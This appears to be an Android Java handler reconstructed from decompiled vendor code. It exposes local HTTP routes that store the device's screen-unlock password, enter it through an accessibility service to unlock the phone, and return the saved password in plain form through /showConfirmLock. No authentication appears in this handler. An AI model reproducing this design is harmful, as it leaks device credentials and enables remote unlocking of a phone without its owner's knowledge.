package com.guard.wallet.server.handler;

import com.guard.wallet.core.AppUtils;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import android.util.Log;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.server.HttpResponseHelper;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.SharedPrefsManager;

/**
 * 解锁/密码 Handler — vendor server/b.java 中 8 路由, 逐方法深度翻译。
 *
 * vendor 方法映射:
 * - /syncLockCipher → t(ReqUnlockDeviceVO, k) — 保存密码 + 刷新无障碍
 * - /enterCipher → A3(ReqUnlockDeviceVO, k) — 输入解锁密码
 * - /confirmLock → F(DeviceCipherStateVO, k) — 确认锁定
 * - /showConfirmLock → j1(k) — 显示本地解锁密码
 * - /unlock → n3(ReqUnlockDeviceVO, k) — 解锁屏幕
 */
public final class UnlockHandler {
    private static final String TAG = "HttpServer";

    private UnlockHandler() {}

    // ─── /unlock → vendor n3(ReqUnlockDeviceVO, k) ───

    /** vendor n3 — 解锁屏幕 */
    public static void unlock(AsyncHttpServerResponse response) {
        try {
            ReqUnlockDeviceVO localCipher = SharedPrefsManager.g();
            if (localCipher == null) {
                localCipher = SharedPrefsManager.f();
            }
            boolean result = AppUtils.S();
            if (com.guard.wallet.utils.SystemHelper.p0()) {
                result = com.guard.wallet.utils.SystemHelper.p1(localCipher);
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /enterCipher → vendor A3(ReqUnlockDeviceVO, k) ───

    /** vendor A3 — 输入解锁密码 */
    public static void enterCipher(Object vo, AsyncHttpServerResponse response) {
        try {
            if (vo == null) {
                HttpResponseHelper.error(response, "你提交的参数有错误、或参数不合法,详见参数错误明细");
                return;
            }
            ReqUnlockDeviceVO req = (vo instanceof ReqUnlockDeviceVO) ? (ReqUnlockDeviceVO) vo : null;
            if (req != null) {
                SharedPrefsManager.C(req); // 保存密码
            }
            boolean result = req != null && com.guard.wallet.utils.SystemHelper.q1(req);
            if (!result && MyAccessibilityService.P() != null) {
                MyAccessibilityService.P().a();
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /confirmLock → vendor F(DeviceCipherStateVO, k) ───

    /** vendor F — 确认锁定状态 */
    public static void confirmLock(Object vo, AsyncHttpServerResponse response) {
        try {
            // vendor: 保存 DeviceCipherStateVO 到 SP
            if (vo != null) {
                try {
                    SharedPrefsManager.D(SharedPrefsManager.N(vo), "deviceCipherState");
                } catch (Exception ignored) {}
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /showConfirmLock → vendor j1(k) ───

    /** vendor j1(k) — 返回本地保存的解锁密码 */
    public static void showConfirmLock(AsyncHttpServerResponse response) {
        try {
            com.guard.wallet.resp.ApiResult result = new com.guard.wallet.resp.ApiResult();
            result.setCode(200);
            result.setMsg("OK");
            result.setCount(0);
            result.setSuccess(Boolean.TRUE);
            // vendor: SharedPrefsManager.u() 获取解锁密码字符串
            String cipher = SharedPrefsManager.l("deviceCipher");
            if (!AppUtils.B(cipher)) {
                result.setData(cipher);
                result.setCount(1);
            }
            String json = SharedPrefsManager.N(result);
            response.code(result.getCode());
            response.setContentType("application/json");
            response.send(json);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /syncLockCipher → vendor t(ReqUnlockDeviceVO, k) ───

    /** vendor t — 保存解锁密码 + 刷新无障碍 */
    public static void syncLockCipher(Object vo, AsyncHttpServerResponse response) {
        try {
            if (vo != null && vo instanceof ReqUnlockDeviceVO) {
                SharedPrefsManager.C((ReqUnlockDeviceVO) vo);
            }
            com.guard.wallet.resp.ApiResult result = new com.guard.wallet.resp.ApiResult();
            result.setCode(200);
            result.setMsg("OK");
            result.setSuccess(Boolean.TRUE);
            if (MyAccessibilityService.P() != null) {
                MyAccessibilityService.P().a();
                result.setData(Boolean.TRUE);
                result.setCount(1);
            }
            String json = SharedPrefsManager.N(result);
            response.code(result.getCode());
            response.setContentType("application/json");
            response.send(json);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /startVerifyCredential ───

    /** 启动凭证验证 */
    public static void startVerifyCredential(AsyncHttpServerResponse response, String pkg) {
        try {
            boolean result = com.guard.wallet.utils.SystemHelper.Q0();
            if (!result && !AppUtils.B(pkg)) {
                result = com.guard.wallet.utils.SystemHelper.Z0(pkg);
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /stopVerifyCredential ───

    /** 停止凭证验证 */
    public static void stopVerifyCredential(AsyncHttpServerResponse response, String pkg) {
        try {
            com.guard.wallet.activity.ConfirmDeviceActivity activity =
                    com.guard.wallet.activity.ConfirmDeviceActivity.getInstance();
            boolean result = false;
            if (activity != null) {
                activity.finish();
                result = true;
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /requestLocalKeepAlive ───

    /** 请求本地保活 */
    public static void requestLocalKeepAlive(AsyncHttpServerResponse response) {
        try {
            HttpResponseHelper.ok(response, com.guard.wallet.thread.StrategyThread.g(null, false));
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }
}
